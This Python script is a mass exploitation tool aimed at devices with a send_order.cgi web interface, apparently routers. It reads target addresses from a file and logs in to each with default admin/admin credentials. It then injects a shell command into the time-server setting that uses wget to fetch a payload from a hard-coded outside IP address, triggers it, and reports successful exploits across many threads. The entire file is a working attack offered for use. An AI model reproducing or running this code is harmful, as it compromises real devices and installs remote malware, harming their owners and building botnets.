import requests
import json
import threading

# Function to send login request
def send_login_request(ip_port):
    try:
        url = f"http://{ip_port}/send_order.cgi?parameter=login"
        headers = {
            "Host": ip_port,
            "Content-Length": "39",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
            "Connection": "close",
        }

        payload = {
            "username": "admin",
            "password": "admin",
        }

        response = requests.post(url, headers=headers, json=payload, allow_redirects=False, timeout=5)

        if response.status_code == 200 and response.json().get("type") == 0 and response.json().get("msg") == "ok":
            print(f"[+] login successful: {ip_port}")

            if 'Set-Cookie' in response.headers:
                cookie_value = response.headers['Set-Cookie'].rstrip(';')
                send_second_request(ip_port, cookie_value)
        # Remove the print statement for failed login
        # else:
        #     print(f"[-] failed login: {ip_port}")

    except requests.Timeout:
        # Remove the print statement for timeout during login
        # print(f"[-] Timeout occurred for {ip_port}")
        pass

# Function to send second request
def send_second_request(ip_port, cookie_value):
    try:
        url = f"http://{ip_port}/send_order.cgi?parameter=advance_sys_set"

        payload = {
            "domain_name": "",
            "timeserver": "`wget${IFS}http://91.92.254.84/magic`",
            "time_year": "",
            "time_month": "",
            "time_date": "",
            "time_hours": "",
            "time_minutes": "",
            "MSS_ENABLE": "NO",
            "MSS_VALUE": "",
            "LAN2LAN_NAT": "YES",
            "H323_ENABLE": "NO",
            "VEF_ENABLE": "YES",
        }

        content_length = len(json.dumps(payload))

        headers = {
            "Host": ip_port,
            "Content-Length": str(content_length),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
            "Cookie": cookie_value,
            "Connection": "close",
        }

        response = requests.post(url, headers=headers, json=payload, allow_redirects=False, timeout=5)

        if response.status_code == 200 and response.json().get("type") == 1 and response.json().get("msg") == "ok":
            print(f"[*] configuration uploaded: {ip_port}")
            send_third_request(ip_port, cookie_value)
        # Remove the print statement for failed configuration upload
        # else:
        #     print(f"[-] failed to upload configuration: {ip_port}")

    except requests.Timeout:
        # Remove the print statement for timeout during configuration upload
        # print(f"[-] Timeout occurred for {ip_port}")
        pass

# Function to send third request
def send_third_request(ip_port, cookie_value):
    try:
        url = f"http://{ip_port}/send_order.cgi?parameter=update_time"
        payload = {
            "update_time": "update_tm",
        }

        content_length = len(json.dumps(payload))

        headers = {
            "Host": ip_port,
            "Content-Length": str(content_length),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
            "Cookie": cookie_value,
            "Connection": "close",
        }

        response = requests.post(url, headers=headers, json=payload, allow_redirects=False, timeout=5)

        if response.status_code == 200 and response.json().get("type") == 1 and response.json().get("msg") == "ok":
            print(f"[+] exploited: {ip_port}")
        # Remove the print statement for failed third request
        # else:
        #     print(f"[failed]: {ip_port}")

    except requests.Timeout:
        # Remove the print statement for timeout during the third request
        # print(f"[-] Timeout occurred for {ip_port}")
        pass

# Function to process IPs using threads
def process_ips_with_threads(ips, num_threads):
    threads = []

    for ip_port in ips:
        thread = threading.Thread(target=send_login_request, args=(ip_port,))
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

# Read IP:PORT or IP from ips.txt
with open("ips.txt", "r") as file:
    ips = [line.strip() for line in file]

# Set the number of threads you want to use
num_threads = 10  # Adjust as needed

# Process IPs with threads
process_ips_with_threads(ips, num_threads)
